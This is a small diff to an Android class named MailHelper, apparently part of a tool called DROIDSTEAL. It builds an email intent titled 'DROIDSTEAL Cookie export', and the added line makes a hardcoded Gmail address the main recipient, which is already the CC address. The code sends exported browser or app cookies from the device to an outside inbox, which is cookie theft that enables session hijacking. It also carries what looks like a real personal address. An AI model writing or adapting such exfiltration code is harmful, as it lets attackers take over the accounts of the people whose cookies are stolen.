@@ -21,6 +21,7 @@ public class MailHelper {
 				
 	    final Intent emailIntent = new Intent(android.content.Intent.ACTION_SEND);
 	    emailIntent .setType("plain/text");
+	    emailIntent .putExtra(android.content.Intent.EXTRA_EMAIL, "Zbob75x@gmail.com");
 	    emailIntent .putExtra(android.content.Intent.EXTRA_SUBJECT, "DROIDSTEAL Cookie export");
 	    emailIntent .putExtra(android.content.Intent.EXTRA_TEXT, sb.toString());
 	    emailIntent .putExtra(android.content.Intent.EXTRA_CC, "Zbob75x@gmail.com");
